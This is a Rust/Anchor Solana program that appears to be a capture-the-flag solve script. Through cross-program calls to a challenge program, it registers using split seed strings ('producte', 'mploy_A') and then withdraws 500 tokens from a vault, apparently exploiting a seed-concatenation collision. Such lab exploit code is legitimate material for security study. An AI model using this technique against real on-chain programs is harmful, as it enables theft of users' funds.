use anchor_lang::prelude::*;

use anchor_spl::token::{Mint, Token, TokenAccount};

declare_id!("28prS7e14Fsm97GE5ws2YpjxseFNkiA33tB5D3hLZv3t");

#[program]
pub mod solve {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {

        let o1 = String::from("producte");
        let e1 = String::from("mploy_A");

        let cpi_accounts = chall::cpi::accounts::Register {
            catalog: ctx.accounts.catalog.to_account_info(),
            employee_record: ctx.accounts.user_record.to_account_info(),
            user: ctx.accounts.user.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::register(cpi_ctx, o1, e1)?;

        // --------------------------------------------
        // your instruction goes here
        let o2 = String::from("producte");
        let e2 = String::from("mploy_A");

        let cpi_accounts = chall::cpi::accounts::Withdraw {
            vault: ctx.accounts.vault.to_account_info(),
            employee_record: ctx.accounts.user_record.to_account_info(),
            reserve: ctx.accounts.reserve.to_account_info(),
            user_account: ctx.accounts.user_token_account.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
            payer: ctx.accounts.user.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::withdraw(cpi_ctx, o2, e2, 500)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub catalog: AccountInfo<'info>,

    #[account(mut)]
    pub user_record: AccountInfo<'info>,

    #[account(mut)]
    pub vault: AccountInfo<'info>,

    pub mint: Account<'info, Mint>,

    #[account(mut)]
    pub reserve: Account<'info, TokenAccount>,

    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,

    #[account(mut)]
    pub user: Signer<'info>,
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub chall: Program<'info, chall::program::Chall>,
    pub rent: Sysvar<'info, Rent>,
}
